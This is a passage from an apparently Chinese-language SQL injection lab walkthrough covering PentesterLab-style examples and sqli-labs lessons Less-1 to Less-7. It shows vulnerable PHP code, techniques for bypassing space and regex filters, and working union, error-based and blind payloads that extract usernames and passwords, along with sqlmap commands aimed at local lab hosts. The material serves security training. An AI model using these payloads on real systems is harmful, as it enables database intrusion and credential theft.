<span class="string">"&lt;/table&gt;"</span>;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>闭合方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td>name=’X’</td>
</tr>
</tbody>
</table>
<p>那么就直接丢 payload 吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example1.php?name=x&apos; union select 1,2,(SELECT+GROUP_CONCAT(name,&quot;:&quot;,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5--+</span><br></pre></td></tr></table></figure>
<h2 id="Example-2-过滤空格"><a href="#Example-2-过滤空格" class="headerlink" title="Example 2 过滤空格"></a>Example 2 过滤空格</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/ /'</span>, $_GET[<span class="string">"name"</span>])) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"ERROR NO SPACE"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where name='"</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"name"</span>].<span class="string">"'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>闭合方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td>name=’X’</td>
</tr>
</tbody>
</table>
<p>和 Example 1 基本上一致，只是这里过滤了 空格，如果匹配到空格的话，直接就终止函数。</p>
<p>过滤空格可以尝试通过下面的字符来替代：</p>
<ul>
<li>%09 TAB 键（水平）</li>
<li>%0a 新建一行</li>
<li>%0c 新的一页</li>
<li>%0d return 功能</li>
<li>%0b TAB 键（垂直）</li>
<li>%a0 空格</li>
<li>/**/ 多行注释</li>
</ul>
<p>最终的 payload 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example2.php?name=x&apos;/**/union/**/select/**/1,2,(SELECT/**/GROUP_CONCAT(name,&quot;:&quot;,passwd/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/users),4,5%23</span><br></pre></td></tr></table></figure>
<h2 id="Example-3-过滤连续空格"><a href="#Example-3-过滤连续空格" class="headerlink" title="Example 3 过滤连续空格"></a>Example 3 过滤连续空格</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/\s+/'</span>, $_GET[<span class="string">"name"</span>])) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"ERROR NO SPACE"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where name='"</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"name"</span>].<span class="string">"'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>闭合方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td>where name=’X’</td>
</tr>
</tbody>
</table>
<p>来过滤一个或多个连续空格。但是，我仍然可以使用多行注释<code>/**/</code> 或者 Example 2 其他字符来 Bypass</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example3.php?name=x&apos;/**/union/**/select/**/1,2,(SELECT/**/GROUP_CONCAT(name,&quot;:&quot;,passwd/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/users),4,5%23</span><br></pre></td></tr></table></figure>
<p>sqlmap 也有内置的 tamper 可以直接使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://10.211.55.20/sqli/example3.php?name=root*%23"</span> --technique=U --dbms=MySQL --tamper=<span class="string">"space2comment"</span> --random-agent --flush-session -v 3 --level=3</span><br></pre></td></tr></table></figure>
<h2 id="Example-4-画蛇添足的过滤"><a href="#Example-4-画蛇添足的过滤" class="headerlink" title="Example 4 画蛇添足的过滤"></a>Example 4 画蛇添足的过滤</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id 直接拼接到 SQL 语句中</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql.=mysql_real_escape_string($_GET[<span class="string">"id"</span>]).<span class="string">" "</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>闭合方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td>where id = X</td>
</tr>
</tbody>
</table>
<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符：<code>\</code>，<code>&#39;</code>，<code>&quot;</code>，那么问题来了 这一题中并没有使用引号来闭合，所以注入的时候我们也不需要引号，所以实际上这个函数并没有发挥作用，下面正常进行注入吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example4.php?id=-2 union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5</span><br></pre></td></tr></table></figure>
<h2 id="Example-5-画蛇添足的正则"><a href="#Example-5-画蛇添足的正则" class="headerlink" title="Example 5 画蛇添足的正则"></a>Example 5 画蛇添足的正则</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^[0-9]+/'</span>, $_GET[<span class="string">"id"</span>])) &#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>);</span><br><span class="line"> &#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"id"</span>] ;</span><br><span class="line"></span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>闭合方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td>where id = X</td>
</tr>
</tbody>
</table>
<p>参数 id 必须是数字开头，否则直接终止函数运行。不过实际手工注入的时候默认 id 是满足这个条件的，除非我们手动修改这个 id 的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example5.php?id=2 and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5</span><br></pre></td></tr></table></figure>
<p>这里不能用 id=-2 来构造报错了，因为正则限制 id 必须是数字开题，所以这里使用了 and 1=2 来构造报错。不过实际上这里不用构造报错也可以的，因为页面不止显示一条查询信息，但是由于注入习惯的原因，国光我这里喜欢构造报错。</p>
<h2 id="Example-6-画蛇添足的正则-again"><a href="#Example-6-画蛇添足的正则-again" class="headerlink" title="Example 6 画蛇添足的正则 again"></a>Example 6 画蛇添足的正则 again</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/[0-9]+$/'</span>, $_GET[<span class="string">"id"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"id"</span>] ;</span><br><span class="line"></span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>闭合方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td>where id = X</td>
</tr>
</tbody>
</table>
<p>这里和 Example 5 差不多，只是这里确保 id 的值以数字结束，看看我们的上一关的 payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example6.php?id=2 and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5</span><br></pre></td></tr></table></figure>
<p>恰巧是以数字 5 结束，所以这个正则就很画蛇添足</p>
<h2 id="Example-7-m-正则缺陷-Bypass"><a href="#Example-7-m-正则缺陷-Bypass" class="headerlink" title="Example 7 /m 正则缺陷 Bypass"></a>Example 7 <code>/m</code> 正则缺陷 Bypass</h2><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>闭合方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td>where id = X</td>
</tr>
</tbody>
</table>
<p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^-?[0-9]+$/m'</span>, $_GET[<span class="string">"id"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"id"</span>];</span><br><span class="line"></span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>id 只允许 <code>233</code> 或者 <code>-233</code> 这样的形式，这样肯定是无法进行注入的了。天无绝人之路，仔细观察 这里使用了 <code>/m</code> ，<code>/m</code>表示开启多行匹配模式，正常情况下<code>^</code> 和<code>$</code> 是匹配字符串的开始和结尾，开启多行模式之后，多行模式<code>^</code>,<code>$</code>可以匹配每行的开头和结尾。我们常用：</p>
<ul>
<li>%0A 换行</li>
</ul>
<p>来绕过 <code>/m</code> 模式的正则检测，完整的 payload 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example7.php?id=-2%0a union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5</span><br></pre></td></tr></table></figure>
<p>使用 sqlmap 也是可以正常进行注入的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://10.211.55.20/sqli/example7.php?id=2"</span> --technique=U --dbms=MySQL --prefix=<span class="string">"%0a"</span> --random-agent --flush-session -v 3</span><br></pre></td></tr></table></figure>
<h2 id="Example-8-order-by-盲注"><a href="#Example-8-order-by-盲注" class="headerlink" title="Example 8 order by 盲注"></a>Example 8 order by 盲注</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY `"</span>;</span><br><span class="line">$sql .= mysql_real_escape_string($_GET[<span class="string">"order"</span>]).<span class="string">"`"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>闭合方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td>order by <code>X</code></td>
</tr>
</tbody>
</table>
<p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。不过注入方式也十分灵活，下面在本关来详细讲解一下。这里并没有输出报错日志，这里只能使用盲注，效率要低一些，国光这里使用布尔类型盲注来简单尝试一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据库第 1 位的 ascii 码为 101 即 e</span></span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;100) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line"></span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;101) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库第 2 位的 ascii 码为 120 即 x</span></span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;119) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line"></span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;120) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>直接用 sqlmap 当然也是可以跑起来的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://10.211.55.20/sqli/example8.php?order=name"</span> --technique=B --dbms=MySQL --prefix=<span class="string">'`'</span> --random-agent --flush-session -v 3 --level 3</span><br></pre></td></tr></table></figure>
<h2 id="Example-9-order-by-盲注"><a href="#Example-9-order-by-盲注" class="headerlink" title="Example 9 order by 盲注"></a>Example 9 order by 盲注</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY "</span>;</span><br><span class="line">$sql .= mysql_real_escape_string($_GET[<span class="string">"order"</span>]);</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>闭合方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td>order by X</td>
</tr>
</tbody>
</table>
<p>比 Example 8 更简单，这里没有奇怪的闭合拼接方式就直接导入到 SQL 语句中了，下面直接开始注入吧：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据库第 1 位的 ascii 码为 101 即 e</span></span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;100) THEN 0x6e616d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;101) THEN 0x6e616d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库第 2 位的 ascii 码为 120 即 x</span></span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;119) THEN 0x6e616d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;120) THEN 0x6e616d65 ELSE 0x28 END))</span><br></pre></td></tr></table></figure>
<p>直接用 sqlmap 当然也是可以跑起来的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://10.211.55.20/sqli/example9.php?order=name"</span> --technique=B --dbms=MySQL --random-agent --flush-session -v 3</span><br></pre></td></tr></table></figure>
<h1 id="Sqli-labs-靶场通关记录"><a href="#Sqli-labs-靶场通关记录" class="headerlink" title="Sqli-labs 靶场通关记录"></a>Sqli-labs 靶场通关记录</h1><h2 id="基础挑战-1-20-关"><a href="#基础挑战-1-20-关" class="headerlink" title="基础挑战 1-20 关"></a>基础挑战 1-20 关</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p><strong>源码简单分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单引号拼接</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持联合、报错、布尔盲注、延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出查询内容</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
<h4 id="报错注入1"><a href="#报错注入1" class="headerlink" title="报错注入1"></a>报错注入1</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span><br></pre></td></tr></table></figure>
<h4 id="报错注入2"><a href="#报错注入2" class="headerlink" title="报错注入2"></a>报错注入2</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1--+</span><br></pre></td></tr></table></figure>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>数据库第一个字母为 <code>s</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and left(database(),1)&gt;&apos;r&apos;--+</span><br><span class="line">?id=1&apos; and left(database(),1)&gt;&apos;s&apos;--+</span><br></pre></td></tr></table></figure>
<h4 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h4><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+</span><br><span class="line">?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p><strong>联合查询注入</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure>
<p><strong>报错注入</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=E -v 3</span><br></pre></td></tr></table></figure>
<p><strong>布尔盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure>
<p><strong>延时盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</span><br></pre></td></tr></table></figure>
<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=$id</code></td>
</tr>
</tbody>
</table>
<p>和 Less-1 利用方式一致，只是闭合方式不一样而已，这里即不再啰嗦了。</p>
<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody>
</table>
<p>和 Less-1 利用方式一致，只是闭合方式不一样而已，这里即不再啰嗦了。</p>
<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=(&quot;$id&quot;)</code></td>
</tr>
</tbody>
</table>
<p><strong>源码简单分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先双引号 在括号拼接</span></span><br><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持联合、报错、布尔盲注、延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出查询内容</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p><strong>源码简单分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接单引号拼接</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持报错、布尔盲注、延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出 You are in...........</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致，这里即不再啰嗦了。</p>
<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-5 利用方式一致，只是闭合方式不一样，这里即不再啰嗦了。</p>
<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>id=((&#39;$id&#39;))</code></td>
</tr>
</tbody>
</table>
<p><strong>源码简单分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用单引号加双层括号拼接</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持布尔盲注、延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出 You are in.... <span class="keyword">Use</span> <span class="title">outfile</span>......</span><br><span class="line"><span class="title">else</span>:</span><br><span class="line">    输出 <span class="title">You</span> <span class="title">have</span> <span class="title">an</span> <span class="title">error</span> <span class="title">in</span> <span class="title">your</span> <span class="title">SQL</span> <span class="title">syntax</span></span><br><span class="line">  //<span class="title">print_r</span>(<span class="title">mysql_error</span>());</span><br></pre></td></tr></table></figure>
<p>因为这里把<code>print_r(mysql_error());</code>给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。</p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>盲注还是常规思路，这里实际上和前面的是一样的，就再啰嗦一下，使用 sqlmap 直接验证看看：</p>
<p><strong>布尔盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-7/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure>
<p>sqlmap 的 Payload 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;) AND 3542=3542 AND (&apos;rmsD&apos;=&apos;rmsD</span><br></pre></td></tr></table></figure>
<p><strong>延时盲注</strong></p>
